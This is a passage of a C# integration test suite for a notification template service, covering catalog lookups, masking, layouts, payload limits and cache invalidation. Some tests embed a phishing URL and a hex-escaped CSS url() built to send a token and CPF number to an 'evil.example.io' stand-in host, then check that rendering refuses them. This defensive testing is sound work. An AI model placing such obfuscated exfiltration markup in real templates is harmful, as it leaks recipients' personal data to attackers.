using System.Net.Http.Json;
using System.Text.Json;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using NotificationHub.Api.Modules.TemplateManagement.Domain;
using NotificationHub.Api.Modules.TemplateManagement.Infrastructure.Integration;
using NotificationHub.Api.Modules.TemplateManagement.Infrastructure.Persistence;
using NotificationHub.Api.Modules.TemplateManagement.Integration.V1;
using NotificationHub.SharedKernel;

namespace NotificationHub.IntegrationTests.TemplateManagement;

[Collection(TemplateManagementApiCollectionDefinition.Name)]
public sealed class PublishedIntegrationContractTests(TemplateManagementApiFixture fixture)
{
    /// <summary>
    /// Raw text on purpose. Spelled as a C# escape the compiler would fold it
    /// into one code unit and the payload under test would never carry the six
    /// characters that make it unreadable.
    /// </summary>
    private const string LoneSurrogateEscape = @"\ud800";

    private static readonly string[] RequiredOrderId = ["orderId"];
    private static readonly string[] RequiredCode = ["code"];

    [RequiresDockerFact]
    public async Task The_catalog_returns_the_decision_metadata_of_the_published_version()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        var key = await TemplateApi.CreateTemplateAsync(
            author, TemplateApi.NewKey(), defaultLocale: "pt-BR", sensitiveVariables: ["cpf"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
        etag = await TemplateApi.PutContentAsync(author, key, version, "email/pt-BR", new
        {
            subject = "Pedido {{ orderId }}",
            body = "<p>Pedido {{ orderId }} atualizado.</p>",
            bodyText = "Pedido {{ orderId }} atualizado.",
        }, etag);
        etag = await TemplateApi.PutContentAsync(author, key, version, "sms/pt-BR", new
        {
            body = "Pedido {{ orderId }} atualizado.",
        }, etag);
        // 'cpf' is declared sensitive on the identity, so the schema has to
        // declare it too: a sensitive name the schema never declares masks
        // nothing, and publication now refuses that false assurance.
        await TemplateApi.PutSchemaAsync(author, key, version, new
        {
            type = "object",
            properties = new
            {
                orderId = new { type = "string" },
                cpf = new { type = "string" },
            },
            required = RequiredOrderId,
        }, etag);
        await TemplateApi.PublishAsync(publisher, key, version);

        Result<PublishedTemplateLookup> lookup = await FindTemplateAsync("araia-cambio", key);

        lookup.IsSuccess.ShouldBeTrue(lookup.Error);
        PublishedTemplate template = lookup.Value
            .ShouldBeOfType<PublishedTemplateLookup.Published>().Template;
        template.Application.ShouldBe("araia-cambio");
        template.TemplateKey.ShouldBe(key);
        template.Class.ShouldBe("transactional");
        template.OwnerTeam.ShouldBe("growth-squad");
        template.Purpose.ShouldBe("order-updates");
        template.LegalBasis.ShouldBe("execucao-de-contrato");
        template.SensitiveVariables.ShouldBe(["cpf"]);
        template.ChannelsWithContent.ShouldBe([Channel.Email, Channel.Sms], ignoreOrder: true);
        template.DefaultLocale.ShouldBe("pt-BR");
        template.Version.ShouldBe(version);

        var storedHash = await StoredVersionContentHashAsync(key, version);
        template.ContentHash.ShouldBe(storedHash);
    }

    [RequiresDockerFact]
    public async Task A_deprecated_template_reports_the_catalog_deprecation_reason()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var key, var version) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, key, version);
        HttpResponseMessage deprecated = await publisher.PostAsJsonAsync(
            $"/v1/templates/{key}/deprecate",
            new { reason = "superseded-by-new-version", note = "substituído pela nova jornada" });
        deprecated.EnsureSuccessStatusCode();

        Result<PublishedTemplateLookup> lookup = await FindTemplateAsync("araia-cambio", key);

        lookup.IsSuccess.ShouldBeTrue(lookup.Error);
        lookup.Value.ShouldBeOfType<PublishedTemplateLookup.Rejected>()
            .Reason.ShouldBe(TemplateRejectionReasons.Deprecated);
    }

    [RequiresDockerFact]
    public async Task A_disabled_template_reports_the_catalog_disablement_reason()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var key, var version) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, key, version);
        HttpResponseMessage disabled = await publisher.PostAsJsonAsync(
            $"/v1/templates/{key}/disable",
            new { reason = "content-incorrect", note = "conteúdo incorreto em produção" });
        disabled.EnsureSuccessStatusCode();

        Result<PublishedTemplateLookup> lookup = await FindTemplateAsync("araia-cambio", key);

        lookup.IsSuccess.ShouldBeTrue(lookup.Error);
        lookup.Value.ShouldBeOfType<PublishedTemplateLookup.Rejected>()
            .Reason.ShouldBe(TemplateRejectionReasons.Disabled);
    }

    [RequiresDockerFact]
    public async Task A_template_of_another_application_is_not_found()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var key, var version) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, key, version);

        Result<PublishedTemplateLookup> lookup = await FindTemplateAsync("araia-investimentos", key);

        lookup.IsFailure.ShouldBeTrue();
        lookup.ErrorKind.ShouldBe(ResultErrorKind.NotFound);
    }

    [RequiresDockerFact]
    public async Task A_provided_variable_the_published_schema_does_not_declare_fails_the_report()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var key, var version) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, key, version);

        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedVariablesValidator validator =
            scope.ServiceProvider.GetRequiredService<IPublishedVariablesValidator>();
        Result<VariablesValidationReport> report = await validator.ValidateAsync(
            "araia-cambio",
            key,
            Variables("""{ "orderId": "42", "cupom": "MB10" }"""),
            CancellationToken.None);

        report.IsSuccess.ShouldBeTrue(report.Error);
        report.Value!.Passed.ShouldBeFalse();
        VariablesValidationCheck check = report.Value!.Checks.Single(candidate =>
            candidate.Name == "variables-declared");
        check.Status.ShouldBe(VariablesValidationStatuses.Failed);
        check.Message.ShouldContain("'cupom'");
    }

    [RequiresDockerFact]
    public async Task A_url_variable_outside_the_allowlist_fails_the_report()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        var key = await TemplateApi.CreateTemplateAsync(
            author, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
        etag = await TemplateApi.PutContentAsync(author, key, version, "email/pt-BR", new
        {
            subject = "Acesso",
            body = "<p>Acesse {{ portalUrl }}</p>",
            bodyText = "Acesse {{ portalUrl }}",
        }, etag);
        await TemplateApi.PutSchemaAsync(author, key, version, new
        {
            type = "object",
            properties = new { portalUrl = new { type = "string", format = "url" } },
        }, etag);
        await TemplateApi.PublishAsync(publisher, key, version);

        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedVariablesValidator validator =
            scope.ServiceProvider.GetRequiredService<IPublishedVariablesValidator>();
        Result<VariablesValidationReport> report = await validator.ValidateAsync(
            "araia-cambio",
            key,
            Variables("""{ "portalUrl": "https://phishing.example.io/login" }"""),
            CancellationToken.None);

        report.IsSuccess.ShouldBeTrue(report.Error);
        VariablesValidationCheck check = report.Value!.Checks.Single(candidate =>
            candidate.Name == "url-allowlist");
        check.Status.ShouldBe(VariablesValidationStatuses.Failed);
        check.Message.ShouldContain("'portalUrl'");
        check.Message.ShouldNotContain("phishing.example.io");
    }

    [RequiresDockerFact]
    public async Task A_foreign_destination_composed_by_a_published_render_is_refused()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        var key = await TemplateApi.CreateTemplateAsync(
            author, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
        const string ComposedDestination = """
            <div style="background-image:u{{ "rl" }}(\68 \74 \74 \70 \73 \3a \2f \2f \65 vil\2e {{ middle }}\2e io/pay?token={{ token }}&amp;cpf={{ cpf }})">conteúdo</div>
            """;
        etag = await TemplateApi.PutContentAsync(author, key, version, "email/pt-BR", new
        {
            subject = "Atualização",
            body = ComposedDestination,
            bodyText = "Atualização {{ middle }}",
        }, etag);
        await TemplateApi.PutSchemaAsync(author, key, version, new
        {
            type = "object",
            properties = new
            {
                middle = new { type = "string" },
                token = new { type = "string" },
                cpf = new { type = "string" },
            },
        }, etag);
        await TemplateApi.PublishAsync(publisher, key, version);

        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedTemplateRenderer renderer =
            scope.ServiceProvider.GetRequiredService<IPublishedTemplateRenderer>();
        Result<PublishedTemplateRender> rendered = await renderer.RenderAsync(new PublishedRenderRequest
        {
            Application = "araia-cambio",
            TemplateKey = key,
            Channel = "email",
            Locale = "pt-BR",
            Variables = Variables("""
                {
                  "middle": "example",
                  "token": "tok_personal_123",
                  "cpf": "123.456.789-09"
                }
                """),
        }, CancellationToken.None);

        rendered.IsFailure.ShouldBeTrue();
        rendered.ErrorKind.ShouldBe(ResultErrorKind.Validation);
        DomainErrorInfo error = DomainError.Describe(rendered.Error, rendered.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain("evil.example.io");
        error.Detail.ShouldNotContain("token=");
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("123.456.789-09");
    }

    [RequiresDockerFact]
    public async Task A_foreign_destination_created_only_by_masking_is_refused()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        var key = await TemplateApi.CreateTemplateAsync(
            author,
            TemplateApi.NewKey(),
            defaultLocale: "pt-BR",
            linkDomainsAllowed: ["montebravo.com.br"],
            sensitiveVariables: ["code"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
        const string ConditionalDestination = """
            {{ if code == "***" }}<div style="background-image:u{{ "rl" }}(\68 \74 \74 \70 \73 \3a \2f \2f \65 vil\2e {{ middle }}\2e io/pay?token={{ token }})">conteúdo</div>{{ else }}<p>Código {{ code }}</p>{{ end }}
            """;
        etag = await TemplateApi.PutContentAsync(author, key, version, "email/pt-BR", new
        {
            subject = "Código de acesso",
            body = ConditionalDestination,
            bodyText = "Código {{ code }}",
        }, etag);
        await TemplateApi.PutSchemaAsync(author, key, version, new
        {
            type = "object",
            properties = new
            {
                code = new { type = "string" },
                middle = new { type = "string" },
                token = new { type = "string" },
            },
            required = RequiredCode,
        }, etag);
        await TemplateApi.PublishAsync(publisher, key, version);

        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedTemplateRenderer renderer =
            scope.ServiceProvider.GetRequiredService<IPublishedTemplateRenderer>();
        Result<PublishedTemplateRender> rendered = await renderer.RenderAsync(new PublishedRenderRequest
        {
            Application = "araia-cambio",
            TemplateKey = key,
            Channel = "email",
            Locale = "pt-BR",
            Variables = Variables("""
                {
                  "code": "998877",
                  "middle": "example",
                  "token": "masked_secret"
                }
                """),
            IncludeMaskedForm = true,
        }, CancellationToken.None);

        rendered.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(rendered.Error, rendered.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain("evil.example.io");
        error.Detail.ShouldNotContain("masked_secret");
    }

    [RequiresDockerFact]
    public async Task The_full_and_masked_forms_render_with_the_pinned_layout_and_coherent_hashes()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishedLayoutAsync(author, publisher);
        var key = await TemplateApi.CreateTemplateAsync(
            author, TemplateApi.NewKey(), defaultLocale: "pt-BR", sensitiveVariables: ["code"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
        etag = await TemplateApi.PutContentAsync(author, key, version, "email/pt-BR", new
        {
            subject = "Código de acesso",
            body = "<p>Código {{ code }}</p>",
            bodyText = "Código {{ code }}",
        }, etag);
        etag = await TemplateApi.PutSchemaAsync(author, key, version, new
        {
            type = "object",
            properties = new { code = new { type = "string" } },
            required = RequiredCode,
        }, etag);
        HttpResponseMessage pinned = await author.SendAsync(TemplateApi.PutJson(
            $"/v1/templates/{key}/versions/{version}/layout",
            new { layoutKey, layoutVersion },
            etag));
        pinned.EnsureSuccessStatusCode();
        await TemplateApi.PublishAsync(publisher, key, version);

        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedTemplateRenderer renderer =
            scope.ServiceProvider.GetRequiredService<IPublishedTemplateRenderer>();
        Result<PublishedTemplateRender> rendered = await renderer.RenderAsync(new PublishedRenderRequest
        {
            Application = "araia-cambio",
            TemplateKey = key,
            Channel = "email",
            Locale = "pt-BR",
            Variables = Variables("""{ "code": "998877" }"""),
            IncludeMaskedForm = true,
        }, CancellationToken.None);

        rendered.IsSuccess.ShouldBeTrue(rendered.Error);
        PublishedTemplateRender render = rendered.Value!;
        render.Channel.ShouldBe("email");
        render.ResolvedLocale.ShouldBe("pt-BR");
        render.Version.ShouldBe(version);

        render.Full.Subject.ShouldBe("Código de acesso");
        render.Full.Body.ShouldBe("<html><header>MB</header><p>Código 998877</p><footer>rodapé</footer></html>");
        render.Full.BodyText.ShouldBe("MB\nCódigo 998877\nrodapé");

        RenderedForm masked = render.Masked.ShouldNotBeNull();
        masked.Subject.ShouldBe("Código de acesso");
        masked.Body.ShouldBe("<html><header>MB</header><p>Código ***</p><footer>rodapé</footer></html>");
        masked.BodyText.ShouldBe("MB\nCódigo ***\nrodapé");

        // Each hash covers exactly the fields its form shipped, in the same
        // canonical dialect the stored content columns use.
        render.Full.ContentHash.ShouldBe(
            CanonicalHash.OfFields(render.Full.Subject, render.Full.Body, render.Full.BodyText));
        masked.ContentHash.ShouldBe(
            CanonicalHash.OfFields(masked.Subject, masked.Body, masked.BodyText));
        masked.ContentHash.ShouldNotBe(render.Full.ContentHash);
    }

    [RequiresDockerFact]
    public async Task A_layout_that_reads_a_template_variable_is_refused_the_payload()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");

        // The layout asks for a variable of the template payload. Publication
        // allows it, because a layout is only required to read the content
        // placeholder; the render is what has to refuse it, since the layout
        // sees the finished text and never the data it was rendered from.
        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
            author,
            body: "<html>{{ content }}<!-- {{ code }} --></html>");
        await LayoutApi.PublishAsync(publisher, layoutKey, layoutVersion);

        var key = await TemplateApi.CreateTemplateAsync(author, TemplateApi.NewKey(), defaultLocale: "pt-BR");
        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
        etag = await TemplateApi.PutContentAsync(author, key, version, "email/pt-BR", new
        {
            subject = "Código de acesso",
            body = "<p>Código {{ code }}</p>",
            bodyText = "Código {{ code }}",
        }, etag);
        etag = await TemplateApi.PutSchemaAsync(author, key, version, new
        {
            type = "object",
            properties = new { code = new { type = "string" } },
            required = RequiredCode,
        }, etag);
        HttpResponseMessage pinned = await author.SendAsync(TemplateApi.PutJson(
            $"/v1/templates/{key}/versions/{version}/layout",
            new { layoutKey, layoutVersion },
            etag));
        pinned.EnsureSuccessStatusCode();
        await TemplateApi.PublishAsync(publisher, key, version);

        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedTemplateRenderer renderer =
            scope.ServiceProvider.GetRequiredService<IPublishedTemplateRenderer>();
        Result<PublishedTemplateRender> rendered = await renderer.RenderAsync(new PublishedRenderRequest
        {
            Application = "araia-cambio",
            TemplateKey = key,
            Channel = "email",
            Locale = "pt-BR",
            Variables = Variables("""{ "code": "998877" }"""),
        }, CancellationToken.None);

        // Refused, not resolved to nothing: the failure is what keeps a value
        // out of a frame the caller never exposed it to.
        rendered.IsFailure.ShouldBeTrue();
        rendered.Error!.ShouldContain("code");
        rendered.Error!.ShouldNotContain("998877");
    }

    [RequiresDockerFact]
    public async Task A_payload_without_sensitive_variables_shares_one_form_and_one_hash()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var key, var version) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, key, version);

        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedTemplateRenderer renderer =
            scope.ServiceProvider.GetRequiredService<IPublishedTemplateRenderer>();
        Result<PublishedTemplateRender> rendered = await renderer.RenderAsync(new PublishedRenderRequest
        {
            Application = "araia-cambio",
            TemplateKey = key,
            Channel = "email",
            Locale = "pt-BR",
            Variables = Variables("""{ "orderId": "42" }"""),
            IncludeMaskedForm = true,
        }, CancellationToken.None);

        rendered.IsSuccess.ShouldBeTrue(rendered.Error);
        RenderedForm masked = rendered.Value!.Masked.ShouldNotBeNull();
        masked.ShouldBe(rendered.Value!.Full);
    }

    [RequiresDockerFact]
    public async Task A_disabled_layout_refuses_the_published_render()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishedLayoutAsync(author, publisher);
        var key = await PublishTemplatePinnedToLayoutAsync(author, publisher, layoutKey, layoutVersion);
        HttpResponseMessage disabled = await publisher.PostAsJsonAsync(
            $"/v1/layouts/{layoutKey}/disable",
            new { reason = "content-compromised", note = "conteúdo comprometido no próprio wrapper" });
        disabled.EnsureSuccessStatusCode();

        // Nothing rendered this layout before it was disabled, so no memoized
        // answer can be the one under test here: this is what the store says.
        Result<PublishedTemplateRender> rendered = await RenderPublishedEmailAsync(key);

        // The whole message stops, whatever the class of the template: a body
        // shipped without the wrapper carries a canonical hash that matches
        // nothing anyone approved.
        rendered.IsFailure.ShouldBeTrue();
        rendered.ErrorKind.ShouldBe(ResultErrorKind.BusinessRule);
        rendered.Error.ShouldBe(LayoutRejectionReasons.Disabled);
    }

    [RequiresDockerFact]
    public async Task A_deprecated_layout_still_frames_the_published_render()
    {
        // Falsification of the refusal above: without this pair, that
        // assertion would hold for any status other than active. Deprecation
        // says the layout takes no new reference, not that the versions
        // already pinned to it stop being reproducible.
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishedLayoutAsync(author, publisher);
        var key = await PublishTemplatePinnedToLayoutAsync(author, publisher, layoutKey, layoutVersion);
        HttpResponseMessage deprecated = await publisher.PostAsJsonAsync(
            $"/v1/layouts/{layoutKey}/deprecate",
            new { reason = "visual-identity-change", note = "substituído pela nova identidade visual" });
        deprecated.EnsureSuccessStatusCode();

        Result<PublishedTemplateRender> rendered = await RenderPublishedEmailAsync(key);

        rendered.IsSuccess.ShouldBeTrue(rendered.Error);
        rendered.Value!.Full.Body.ShouldBe(
            "<html><header>MB</header><p>Pedido 42 atualizado.</p><footer>rodapé</footer></html>");
    }

    /// <summary>
    /// The ceiling on the variables payload reaches the render between
    /// modules, and it answers ahead of the catalog. The template key is one
    /// that was never created on purpose: a not-found here would be proof that
    /// the payload was carried past the gate, into the query and into the walk
    /// over every string value it contains.
    /// </summary>
    [RequiresDockerFact]
    public async Task An_oversized_variables_payload_is_refused_before_the_catalog_and_the_scan()
    {
        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedTemplateRenderer renderer =
            scope.ServiceProvider.GetRequiredService<IPublishedTemplateRenderer>();

        Result<PublishedTemplateRender> rendered = await renderer.RenderAsync(new PublishedRenderRequest
        {
            Application = "araia-cambio",
            TemplateKey = "template.that.was.never.created",
            Channel = "email",
            Locale = "pt-BR",
            Variables = Variables($$$"""{ "blob": "{{{new string('x', 300_000)}}}" }"""),
            IncludeMaskedForm = true,
        }, CancellationToken.None);

        rendered.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(rendered.Error, rendered.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.VariablesPayloadTooLarge);

        // The refusal names the ceiling and nothing the caller sent: the same
        // rule the allowlist refusal follows, for the same reason.
        error.Detail.ShouldContain("262144");
        error.Detail.ShouldNotContain("xxx");
    }

    /// <summary>
    /// Defence in depth on the same entry point. Every caller that reaches
    /// this contract validates the payload first, so a payload that cannot be
    /// transcoded should never arrive here; if one does, this is the last
    /// place that can still answer instead of failing, because every step past
    /// it walks the payload. The template key is one that was never created on
    /// purpose: a not-found here would be proof that the payload was carried
    /// past the gate.
    /// </summary>
    [RequiresDockerFact]
    public async Task A_variables_payload_whose_escape_names_no_character_is_refused_and_never_throws()
    {
        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedTemplateRenderer renderer =
            scope.ServiceProvider.GetRequiredService<IPublishedTemplateRenderer>();

        // The premise, asserted rather than assumed: the payload is legal JSON
        // text and binds without complaint. A payload that never parsed would
        // let the rest of the test pass while proving nothing.
        JsonElement variables = Variables($$"""{"orderId":"{{LoneSurrogateEscape}}"}""");
        variables.ValueKind.ShouldBe(JsonValueKind.Object);

        Result<PublishedTemplateRender> rendered = await renderer.RenderAsync(new PublishedRenderRequest
        {
            Application = "araia-cambio",
            TemplateKey = "template.that.was.never.created",
            Channel = "email",
            Locale = "pt-BR",
            Variables = variables,
            IncludeMaskedForm = true,
        }, CancellationToken.None);

        rendered.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(rendered.Error, rendered.ErrorKind);

        // The code is its own, not the ceiling's: a caller told to shorten a
        // payload that names no character has been handed the wrong thing to
        // fix, and a consumer routing on the code would route it wrong.
        error.Code.ShouldBe(ErrorCodes.VariablesPayloadUnreadable);
        error.Detail.ShouldNotContain("262144");
    }

    [RequiresDockerFact]
    public async Task The_published_class_policy_is_read_by_application_and_class()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var application, var version, _) = await ClassPolicyApi.CreateDraftAsync(author);
        await ClassPolicyApi.PublishAsync(publisher, application);

        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedCatalog catalog = scope.ServiceProvider.GetRequiredService<IPublishedCatalog>();
        Result<PublishedClassPolicy> policy = await catalog.FindClassPolicyAsync(
            application, ClassPolicyApi.DefaultClass, CancellationToken.None);

        policy.IsSuccess.ShouldBeTrue(policy.Error);
        policy.Value!.Application.ShouldBe(application);
        policy.Value!.Class.ShouldBe(ClassPolicyApi.DefaultClass);
        policy.Value!.Version.ShouldBe(version);
        policy.Value!.Definition.SchemaVersion.ShouldBe(1);
        policy.Value!.Definition.ChannelsAllowed.ShouldBe([Channel.Push, Channel.Sms]);
        policy.Value!.Definition.DedupeWindow.ShouldBe(TimeSpan.FromSeconds(60));

        var storedHash = await StoredPolicyContentHashAsync(application, version);
        policy.Value!.ContentHash.ShouldBe(storedHash);
    }

    [RequiresDockerFact]
    public async Task An_application_without_published_policy_is_not_found()
    {
        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedCatalog catalog = scope.ServiceProvider.GetRequiredService<IPublishedCatalog>();

        Result<PublishedClassPolicy> policy = await catalog.FindClassPolicyAsync(
            ClassPolicyApi.NewApplication(), ClassPolicyApi.DefaultClass, CancellationToken.None);

        policy.IsFailure.ShouldBeTrue();
        policy.ErrorKind.ShouldBe(ResultErrorKind.NotFound);
    }

    /// <summary>
    /// Every read below runs in a fresh scope, which is the realistic shape
    /// and the harder one: the memoization is a singleton, so the staleness
    /// under test belongs to the process that answered the command and never
    /// to the scope a caller happens to hold. The warm-up read is what makes
    /// the defect visible at all, because without it the transition is read
    /// straight from the store.
    /// </summary>
    [RequiresDockerFact]
    public async Task A_disabled_template_stops_answering_published_to_the_process_that_disabled_it()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var key, var version) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, key, version);
        (await FindTemplateAsync("araia-cambio", key)).IsSuccess.ShouldBeTrue();
        (await RenderPublishedEmailAsync(key)).IsSuccess.ShouldBeTrue();

        HttpResponseMessage disabled = await publisher.PostAsJsonAsync(
            $"/v1/templates/{key}/disable",
            new { reason = "content-incorrect", note = "conteúdo incorreto em produção" });
        disabled.EnsureSuccessStatusCode();

        Result<PublishedTemplateLookup> lookup = await FindTemplateAsync("araia-cambio", key);
        Result<PublishedTemplateRender> rendered = await RenderPublishedEmailAsync(key);

        lookup.Value.ShouldBeOfType<PublishedTemplateLookup.Rejected>()
            .Reason.ShouldBe(TemplateRejectionReasons.Disabled);
        DomainError.Describe(rendered.Error, rendered.ErrorKind).Code
            .ShouldBe(TemplateRejectionReasons.Disabled);
    }

    [RequiresDockerFact]
    public async Task A_deprecated_template_stops_answering_published_to_the_process_that_deprecated_it()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var key, var version) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, key, version);
        (await FindTemplateAsync("araia-cambio", key)).IsSuccess.ShouldBeTrue();
        (await RenderPublishedEmailAsync(key)).IsSuccess.ShouldBeTrue();

        HttpResponseMessage deprecated = await publisher.PostAsJsonAsync(
            $"/v1/templates/{key}/deprecate",
            new { reason = "superseded-by-new-version", note = "substituído pela nova jornada" });
        deprecated.EnsureSuccessStatusCode();

        Result<PublishedTemplateLookup> lookup = await FindTemplateAsync("araia-cambio", key);
        Result<PublishedTemplateRender> rendered = await RenderPublishedEmailAsync(key);

        lookup.Value.ShouldBeOfType<PublishedTemplateLookup.Rejected>()
            .Reason.ShouldBe(TemplateRejectionReasons.Deprecated);
        DomainError.Describe(rendered.Error, rendered.ErrorKind).Code
            .ShouldBe(TemplateRejectionReasons.Deprecated);
    }

    [RequiresDockerFact]
    public async Task A_corrective_publication_reaches_the_next_read_of_the_publishing_process()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var key, var first) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, key, first);
        (await FindTemplateAsync("araia-cambio", key)).IsSuccess.ShouldBeTrue();
        (await RenderPublishedEmailAsync(key)).IsSuccess.ShouldBeTrue();

        var second = await PublishCorrectedVersionAsync(author, publisher, key);

        Result<PublishedTemplateLookup> lookup = await FindTemplateAsync("araia-cambio", key);
        Result<PublishedTemplateRender> rendered = await RenderPublishedEmailAsync(key);

        lookup.Value.ShouldBeOfType<PublishedTemplateLookup.Published>()
            .Template.Version.ShouldBe(second);
        rendered.Value!.Full.Body.ShouldBe("<p>Pedido 42 corrigido.</p>");
    }

    [RequiresDockerFact]
    public async Task A_rollback_reaches_the_next_read_of_the_rolling_back_process()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var key, var first) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, key, first);
        var second = await PublishCorrectedVersionAsync(author, publisher, key);
        (await FindTemplateAsync("araia-cambio", key)).IsSuccess.ShouldBeTrue();
        (await RenderPublishedEmailAsync(key)).IsSuccess.ShouldBeTrue();

        HttpResponseMessage rolledBack = await publisher.PostAsJsonAsync(
            $"/v1/templates/{key}/rollback", new { toVersion = first });
        rolledBack.EnsureSuccessStatusCode();

        Result<PublishedTemplateLookup> lookup = await FindTemplateAsync("araia-cambio", key);
        Result<PublishedTemplateRender> rendered = await RenderPublishedEmailAsync(key);

        lookup.Value.ShouldBeOfType<PublishedTemplateLookup.Published>()
            .Template.Version.ShouldBe(second + 1);
        rendered.Value!.Full.Body.ShouldBe("<p>Pedido 42 atualizado.</p>");
    }

    [RequiresDockerFact]
    public async Task A_published_class_policy_reaches_the_next_read_of_the_publishing_process()
    {
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var application, _, _) = await ClassPolicyApi.CreateDraftAsync(author);
        await ClassPolicyApi.PublishAsync(publisher, application);
        (await FindClassPolicyAsync(application)).IsSuccess.ShouldBeTrue();

        await ClassPolicyApi.CreateDraftAsync(
            author, application, definition: ClassPolicyApi.Definition(dedupeWindow: "120s"));
        var second = await ClassPolicyApi.PublishAsync(publisher, application);

        Result<PublishedClassPolicy> policy = await FindClassPolicyAsync(application);

        policy.Value!.Definition.DedupeWindow.ShouldBe(TimeSpan.FromSeconds(120));
        policy.Value!.Version.ShouldBe(second);
    }

    [RequiresDockerFact]
    public async Task A_template_untouched_by_a_disable_keeps_answering_from_memory()
    {
        // Falsification pair of the five assertions above: dropping the whole
        // store on every transition satisfies all of them and throws away the
        // working set of every template nobody touched, turning a rare
        // governance command into a fleet-wide cold start.
        HttpClient author = fixture.CreateAuthorClient("author-1");
        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
        (var target, var targetVersion) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, target, targetVersion);
        (var bystander, var bystanderVersion) = await TemplateApi.CreatePublishableDraftAsync(author);
        await TemplateApi.PublishAsync(publisher, bystander, bystanderVersion);
        (await FindTemplateAsync("araia-cambio", bystander)).IsSuccess.ShouldBeTrue();

        HttpResponseMessage disabled = await publisher.PostAsJsonAsync(
            $"/v1/templates/{target}/disable",
            new { reason = "content-incorrect", note = "conteúdo incorreto em produção" });
        disabled.EnsureSuccessStatusCode();

